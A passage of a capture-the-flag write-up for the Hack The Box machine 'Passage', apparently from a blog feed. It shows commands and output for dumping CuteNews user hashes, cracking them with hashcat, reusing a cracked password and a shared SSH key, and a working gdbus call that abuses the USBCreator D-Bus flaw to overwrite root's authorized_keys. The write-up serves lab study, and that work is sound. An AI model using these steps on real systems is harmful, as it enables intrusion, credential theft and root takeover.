-a:1:<span style="color:#f92672">{</span>s:5:<span style="color:#e6db74">&#34;email&#34;</span>;a:1:<span style="color:#f92672">{</span>s:16:<span style="color:#e6db74">&#34;paul@passage.htb&#34;</span>;s:10:<span style="color:#e6db74">&#34;paul-coles&#34;</span>;<span style="color:#f92672">}}</span>a:1:<span style="color:#f92672">{</span>s:2:<span style="color:#e6db74">&#34;id&#34;</span>;a:1:<span style="color:#f92672">{</span>i:1598829833;s:6:<span style="color:#e6db74">&#34;egre55&#34;</span>;<span style="color:#f92672">}}</span>a:1:<span style="color:#f92672">{</span>s:5:<span style="color:#e6db74">&#34;email&#34;</span>;a:1:<span style="color:#f92672">{</span>s:15:<span style="color:#e6db74">&#34;ahaha@gmail.com&#34;</span>;s:8:<span style="color:#e6db74">&#34;ivanpogi&#34;</span>;<span style="color:#f92672">}}</span>a:2:<span style="color:#f92672">{</span>s:5:<span style="color:#e6db74">&#34;email&#34;</span>;a:1:<span style="color:#f92672">{</span>s:15:<span style="color:#e6db74">&#34;egre55@test.com&#34;</span>;s:6:<span style="color:#e6db74">&#34;egre55&#34;</span>;<span style="color:#f92672">}</span>s:4:<span style="color:#e6db74">&#34;name&#34;</span>;a:1:<span style="color:#f92672">{</span>s:4:<span style="color:#e6db74">&#34;debo&#34;</span>;a:11:<span style="color:#f92672">{</span>s:2:<span style="color:#e6db74">&#34;id&#34;</span>;s:10:<span style="color:#e6db74">&#34;1599412470&#34;</span>;s:4:<span style="color:#e6db74">&#34;name&#34;</span>;s:4:<span style="color:#e6db74">&#34;debo&#34;</span>;s:3:<span style="color:#e6db74">&#34;acl&#34;</span>;s:1:<span style="color:#e6db74">&#34;4&#34;</span>;s:5:<span style="color:#e6db74">&#34;email&#34;</span>;s:13:<span style="color:#e6db74">&#34;debo@debo.com&#34;</span>;s:4:<span style="color:#e6db74">&#34;nick&#34;</span>;s:4:<span style="color:#e6db74">&#34;debo&#34;</span>;s:4:<span style="color:#e6db74">&#34;pass&#34;</span>;s:64:<span style="color:#e6db74">&#34;b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52&#34;</span>;s:4:<span style="color:#e6db74">&#34;more&#34;</span>;s:60:<span style="color:#e6db74">&#34;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&#34;</span>;s:6:<span style="color:#e6db74">&#34;avatar&#34;</span>;s:20:<span style="color:#e6db74">&#34;avatar_debo_bash.php&#34;</span>
-...&lt;SNIP&gt;...
-</code></pre></div><p>And that was a mess.</p>
-<p>Among those outputs, this one concerns me.</p>
-<pre><code>&quot;pass&quot;;s:64:&quot;b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52&quot;
-</code></pre><p><code>hash-identifier</code> identifies it as SHA-256.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «passage» «192.168.43.234»
-$ hash-identifier 84c7cd94cb0d818d27b16d4290d13703d380c54a4d3696fff4587b2862bf6068
-   <span style="color:#75715e">#########################################################################</span>
-   <span style="color:#75715e">#     __  __                     __           ______    _____           #</span>
-   <span style="color:#75715e">#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #</span>
-   <span style="color:#75715e">#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #</span>
-   <span style="color:#75715e">#     \ \  _  \  /&#39;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #</span>
-   <span style="color:#75715e">#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #</span>
-   <span style="color:#75715e">#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #</span>
-   <span style="color:#75715e">#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #</span>
-   <span style="color:#75715e">#                                                             By Zion3R #</span>
-   <span style="color:#75715e">#                                                    www.Blackploit.com #</span>
-   <span style="color:#75715e">#                                                   Root@Blackploit.com #</span>
-   <span style="color:#75715e">#########################################################################</span>
---------------------------------------------------
-
-Possible Hashs:
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SHA-256
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Haval-256
-...&lt;SNIP&gt;...
-</code></pre></div><p>It turns out that those exfiltrated files are how CuteNews stores its database (flat-file database, like <code>/etc/passwd</code>).</p>
-<p><div class="img-container"><img src="imgs/image-20210508032901929.png" alt="image-20210508032901929"  /></div>
-</p>
-<p>Knowing that, I can add another filter using <code>grep</code> to grab the password hashes.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «passage» «192.168.43.234»
-$ cat cdata.users| sed <span style="color:#e6db74">&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> | base64 -d | grep -o -E -e <span style="color:#e6db74">&#34;[0-9a-f]{64}&#34;</span>
-b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52
-7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
-5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
-231cd4eb21af3071fd441d5bb7e42dc5fd6f606cd20a8e3c158b7e7c2923f426
-41e5653fc7aeb894026d6bb7b2db7f65902b454945fa8fd65a6327047b5277fb
-4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
-03d09a66086da4ea6482d717ef1b33e23867afd965e2074e342584157393f91c
-e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
-f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
-84c7cd94cb0d818d27b16d4290d13703d380c54a4d3696fff4587b2862bf6068
-4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
-e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9
-59195c6c541c8307f1da2d1e768d6f2280c984df217ad5f4c64c3542b04111a4
-</code></pre></div><h4 id="cracking-the-hashes">Cracking the Hashes</h4>
-<p><code>hashcat</code> recovered five passwords.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./hashcat.exe -m <span style="color:#ae81ff">1400</span> hashes/passage.hashes ../rockyou.txt -O --show
-b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52:debo
-5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:password
-e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1
-e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9:hacker
-59195c6c541c8307f1da2d1e768d6f2280c984df217ad5f4c64c3542b04111a4:mario
-</code></pre></div><h4 id="su---paul">SU - paul</h4>
-<p>I tried to spray the passwords on SSH, but it wanted an SSH key. I tried again with <code>su</code>, and password <code>atlanta1</code> worked on <code>paul</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@passage:/home$ su paul 
-su paul
-Password: atlanta1
-paul@passage:~$ 
-</code></pre></div><h3 id="shell-as-nadav">Shell as nadav</h3>
-<p>Escalating from <code>paul</code> to <code>nadav</code> is pretty straight forward, I found out that user <code>nadav</code> uses the same SSH keys as user <code>paul</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">paul@passage:~/.ssh$ cat id_rsa.pub <span style="color:#f92672">&amp;&amp;</span> authorized_keys
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
-</code></pre></div><p>So I can just SSH from <code>paul</code> to <code>nadav</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">paul@passage:~/.ssh$ ssh nadav@passage.htb
-Last login: Sun Sep  <span style="color:#ae81ff">6</span> 11:12:03 <span style="color:#ae81ff">2020</span> from 127.0.0.1
-nadav@passage:~$ id
-id
-uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>nadav<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>nadav<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>nadav<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,113<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,128<span style="color:#f92672">(</span>sambashare<span style="color:#f92672">)</span>
-</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
-<h4 id="internal-enumeration-1">Internal enumeration</h4>
-<p>Since <code>nadav</code> is a member of the <code>sudo</code> group, I can just type <code>sudo su</code> to escalate to root, but unfortunately it requires <code>nadav</code>&rsquo;s password.</p>
-<p>So I looking around <code>nadav</code>&rsquo;s home directory, and there is a <code>.viminfo</code> file.</p>
-<p><div class="img-container"><img src="imgs/c0375013a91f483582b37eebffa521d4.png" alt="c0375013a91f483582b37eebffa521d4"  /></div>
-</p>
-<p>The file contains the following information.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">...&lt;SNIP&gt;...
-# Command Line History (newest to oldest):
-:wq
-:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g
-
-
-...&lt;SNIP&gt;...
-# File marks:
-&#39;0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-&#39;1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-
-# Jumplist (newest first):
--&#39;  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
--&#39;  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
--&#39;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
--&#39;  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
--&#39;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
--&#39;  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-
-# History of marks within files (newest to oldest):
-
-&gt; /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-        &#34;       12      7
-
-&gt; /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-        &#34;       2       0
-        .       2       0
-        +       2       0
-</code></pre></div><p>The history of files points to these two configuration files:</p>
-<ul>
-<li><code>/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf</code></li>
-<li><code>/etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf</code></li>
-</ul>
-<p>The <code>51-ubuntu-admin.conf</code> defines there are only two groups that can be used for authentication when administrator authentication is needed, <code>sudo</code> and <code>admin</code>. This file is used by <a href="https://www.freedesktop.org/software/polkit/docs/0.105/pklocalauthority.8.html">Polkit</a>, which allows unprivileged process to communicate with the privileged ones. In the GUI, the prompt that asks you to enter a password when performing an administrative tasks are using Polkit.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nadav@passage:~$ cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-<span style="color:#f92672">[</span>Configuration<span style="color:#f92672">]</span>
-AdminIdentities<span style="color:#f92672">=</span>unix-group:sudo;unix-group:admin
-</code></pre></div><p>I don&rsquo;t really understand in depth about <code>com.ubuntu.USBCreator.conf</code>. What I know is, this configuration file is used by a service called “com.ubuntu.USBCreator” that is owned by root. The ones that can invoke the methods on this service are constrained by PolicyKit/Polkit, and they are anyone in the <code>sudo</code> or the <code>admin</code> group (defined by the <code>51-ubuntu-admin.conf</code> file)</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">nadav@passage:~$ cat /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-<span style="color:#75715e">&lt;!DOCTYPE busconfig PUBLIC
-</span><span style="color:#75715e"> &#34;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN&#34;
-</span><span style="color:#75715e"> &#34;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&#34;&gt;</span>
-<span style="color:#f92672">&lt;busconfig&gt;</span>
-
-  <span style="color:#75715e">&lt;!-- Only root can own the service --&gt;</span>
-  <span style="color:#f92672">&lt;policy</span> <span style="color:#a6e22e">user=</span><span style="color:#e6db74">&#34;root&#34;</span><span style="color:#f92672">&gt;</span>
-    <span style="color:#f92672">&lt;allow</span> <span style="color:#a6e22e">own=</span><span style="color:#e6db74">&#34;com.ubuntu.USBCreator&#34;</span><span style="color:#f92672">/&gt;</span>
-  <span style="color:#f92672">&lt;/policy&gt;</span>
-
-  <span style="color:#75715e">&lt;!-- Allow anyone to invoke methods (further constrained by
-</span><span style="color:#75715e">       PolicyKit privileges --&gt;</span>
-  <span style="color:#f92672">&lt;policy</span> <span style="color:#a6e22e">context=</span><span style="color:#e6db74">&#34;default&#34;</span><span style="color:#f92672">&gt;</span>
-    <span style="color:#f92672">&lt;allow</span> <span style="color:#a6e22e">send_destination=</span><span style="color:#e6db74">&#34;com.ubuntu.USBCreator&#34;</span>
-           <span style="color:#a6e22e">send_interface=</span><span style="color:#e6db74">&#34;com.ubuntu.USBCreator&#34;</span><span style="color:#f92672">/&gt;</span>
-    <span style="color:#f92672">&lt;allow</span> <span style="color:#a6e22e">send_destination=</span><span style="color:#e6db74">&#34;com.ubuntu.USBCreator&#34;</span>
-           <span style="color:#a6e22e">send_interface=</span><span style="color:#e6db74">&#34;org.freedesktop.DBus.Introspectable&#34;</span><span style="color:#f92672">/&gt;</span>
-    <span style="color:#f92672">&lt;allow</span> <span style="color:#a6e22e">send_destination=</span><span style="color:#e6db74">&#34;com.ubuntu.USBCreator&#34;</span>
-           <span style="color:#a6e22e">send_interface=</span><span style="color:#e6db74">&#34;org.freedesktop.DBus.Properties&#34;</span><span style="color:#f92672">/&gt;</span>
-  <span style="color:#f92672">&lt;/policy&gt;</span>
-
-<span style="color:#f92672">&lt;/busconfig&gt;</span>
-</code></pre></div><p>From here, From here, it looks only <code>nadav</code> that can invoke the methods of this service</p>
-<h4 id="usbcreator-d-bus-interface-vulnerability">USBCreator D-Bus Interface Vulnerability</h4>
-<p>There is a research about a vulnerability in USBCreator D-Bus Interface, which can be used for local privilege escalation<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>. The research summary as follows:</p>
-<p>&ldquo;<em>A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the sudoer group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root - without supplying a password. This trivially leads to elevated privileges, for instance, by overwriting the shadow file and setting a password for root. The issue was resolved in June when Ubuntu <a href="https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1832337">patched</a> the relevant packages in response to a vulnerability disclosure from Unit 42.</em>&rdquo;</p>
-<p>The bug was first reported in 2016<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>, and the affected Ubuntu version is 16.04.</p>
-<p><div class="img-container"><img src="imgs/image-20210508150754640.png" alt="image-20210508150754640"  /></div>
-</p>
-<p>The current machine is not an exact match, but since the vulnerability is patched in 2019, it may affect this version too.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nadav@passage:~$ uname -a
-Linux passage 4.15.0-45-generic <span style="color:#75715e">#48~16.04.1-Ubuntu SMP Sun Sep 6 14:31:10 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
-</code></pre></div><h4 id="overwrite-authorized_keys">Overwrite authorized_keys</h4>
-<p>One of the tools used by the researcher to exploit the vulnerability is a CLI-based called <code>gdbus</code>.</p>
-<p>With user <code>nadav</code>, I can try to overwrite the authorized_keys file contents in the root directory with my public key.</p>
-<p>I&rsquo;ll put my public key named <code>key</code> in <code>/dev/shm/</code>, and then I&rsquo;ll  invoke the following command:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /dev/shm/key /root/.ssh/authorized_keys true
-true
-<span style="color:#f92672">()</span>
-</code></pre></div><p>I tried to login as root using my private key, and it worked.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «passage» «10.10.14.31»
-$ ssh -i root_rsa root@10.10.10.206
-Last login: Fri Mar  5 17:33:39 2020 from 10.10.14.7
-root@passage:~# ls -l
-total 12
-drwxr-xr-x 2 root root 4096 Jul 21  2020 exploits
-drwxr-xr-x 2 root root 4096 Jul 21  2020 exploits
--r-------- 1 root root   33 Mar  5 17:05 root.txt
-root@passage:~# 
-</code></pre></div><section class="footnotes" role="doc-endnotes">
-<hr>
-<ol>
-<li id="fn:1" role="doc-endnote">
-<p><a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
-</li>
-<li id="fn:2" role="doc-endnote">
-<p><a href="https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1568149">https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1568149</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
-</li>
-</ol>
-</section>
 ]]></content:encoded>
     </item>
     
